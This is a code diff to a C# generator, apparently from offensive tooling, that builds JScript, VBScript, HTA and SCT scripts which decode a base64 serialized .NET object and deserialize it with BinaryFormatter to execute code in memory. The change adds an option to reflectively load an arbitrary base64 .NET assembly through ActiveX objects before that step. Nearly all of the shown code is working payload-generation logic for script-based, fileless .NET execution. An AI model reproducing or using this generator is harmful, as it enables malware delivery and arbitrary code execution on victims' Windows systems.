@@ -13,14 +13,14 @@ public enum D2JSFormat { JScript, VBScript, Hta, Sct }
 /// </summary>
 public static class D2JSGenerator
 {
-    public static string Generate(string serializedBase64, string entryClass, D2JSFormat format, string runtimeVersion)
+    public static string Generate(string serializedBase64, string entryClass, D2JSFormat format, string runtimeVersion, string? assemblyBase64 = null)
     {
         return format switch
         {
-            D2JSFormat.JScript => BuildJScript(serializedBase64, runtimeVersion),
-            D2JSFormat.VBScript => BuildVBScript(serializedBase64, runtimeVersion),
-            D2JSFormat.Hta => BuildHta(serializedBase64, runtimeVersion),
-            D2JSFormat.Sct => BuildSct(serializedBase64, runtimeVersion),
+            D2JSFormat.JScript => BuildJScript(serializedBase64, runtimeVersion, assemblyBase64),
+            D2JSFormat.VBScript => BuildVBScript(serializedBase64, runtimeVersion, assemblyBase64),
+            D2JSFormat.Hta => BuildHta(serializedBase64, runtimeVersion, assemblyBase64),
+            D2JSFormat.Sct => BuildSct(serializedBase64, runtimeVersion, assemblyBase64),
             _ => ""
         };
     }
@@ -118,8 +118,31 @@ public static class D2JSGenerator
 
     // ── Script Templates ───────────────────────────────────────────────
 
-    private static string BuildJScript(string b64, string version)
+    private static string BuildJScript(string b64, string version, string? asmB64 = null)
     {
+        string asmFn = "", asmVar = "", asmCall = "";
+        if (asmB64 is not null)
+        {
+            asmFn = @"
+
+function loadAssembly(b) {
+    var enc = new ActiveXObject(""System.Text.ASCIIEncoding"");
+    var length = enc.GetByteCount_2(b);
+    var ba = enc.GetBytes_4(b);
+    var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
+    ba = transform.TransformFinalBlock(ba, 0, length);
+    var asmType = enc.GetType().Assembly.GetType(""System.Reflection.Assembly"");
+    var al = new ActiveXObject(""System.Collections.ArrayList"");
+    al.Add(ba);
+    asmType.InvokeMember(""Load"", 280, null, null, al.ToArray());
+}
+";
+            asmVar = $@"var assembly_obj = ""{asmB64}"";
+";
+            asmCall = @"
+    loadAssembly(assembly_obj);";
+        }
+
         return $@"function setversion() {{
     new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = '{version}';
 }}
@@ -134,12 +157,11 @@ function base64ToStream(b) {{
     ms.Write(ba, 0, (length / 4) * 3);
     ms.Position = 0;
     return ms;
-}}
-
+}}{asmFn}{asmVar}
 var serialized_obj = ""{b64}"";
 
 try {{
-    setversion();
+    setversion();{asmCall}
     var stm = base64ToStream(serialized_obj);
     var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
     var al = new ActiveXObject('System.Collections.ArrayList');
@@ -149,8 +171,29 @@ try {{
 }} catch (e) {{}}";
     }
 
-    private static string BuildVBScript(string b64, string version)
+    private static string BuildVBScript(string b64, string version, string? asmB64 = null)
     {
+        string asmSub = "", asmVar = "", asmCall = "";
+        if (asmB64 is not null)
+        {
+            asmSub = @"
+
+Sub LoadAssembly(b)
+    Dim enc, length, ba, transform, asmType, al
+    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
+    length = enc.GetByteCount_2(b)
+    ba = enc.GetBytes_4(b)
+    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
+    ba = transform.TransformFinalBlock(ba, 0, length)
+    Set asmType = enc.GetType().Assembly.GetType(""System.Reflection.Assembly"")
+    Set al = CreateObject(""System.Collections.ArrayList"")
+    al.Add ba
+    asmType.InvokeMember ""Load"", 280, Nothing, Nothing, al.ToArray()
+End Sub";
+            asmVar = FormatVBString("assembly_obj", asmB64) + "\n\n";
+            asmCall = "LoadAssembly assembly_obj\n";
+        }
+
         var blobLines = FormatVBString("serialized_obj", b64);
 
         return $@"Sub SetVersion()
@@ -170,13 +213,13 @@ Function Base64ToStream(b)
     ms.Write ba, 0, (length \ 4) * 3
     ms.Position = 0
     Set Base64ToStream = ms
-End Function
+End Function{asmSub}
 
-{blobLines}
+{asmVar}{blobLines}
 
 On Error Resume Next
 SetVersion
-Dim stm
+{asmCall}Dim stm
 Set stm = Base64ToStream(serialized_obj)
 Dim fmt
 Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
@@ -187,9 +230,9 @@ Set d = fmt.Deserialize_2(stm)
 al.Add Empty";
     }
 
-    private static string BuildHta(string b64, string version)
+    private static string BuildHta(string b64, string version, string? asmB64 = null)
     {
-        var js = BuildJScript(b64, version);
+        var js = BuildJScript(b64, version, asmB64);
         return $@"<html>
 <head>
 <script language=""JScript"">
@@ -201,9 +244,9 @@ window.close();
 </html>";
     }
 
-    private static string BuildSct(string b64, string version)
+    private static string BuildSct(string b64, string version, string? asmB64 = null)
     {
-        var js = BuildJScript(b64, version);
+        var js = BuildJScript(b64, version, asmB64);
         var guid = Guid.NewGuid().ToString();
         return $@"<?XML version=""1.0""?>
 <scriptlet>
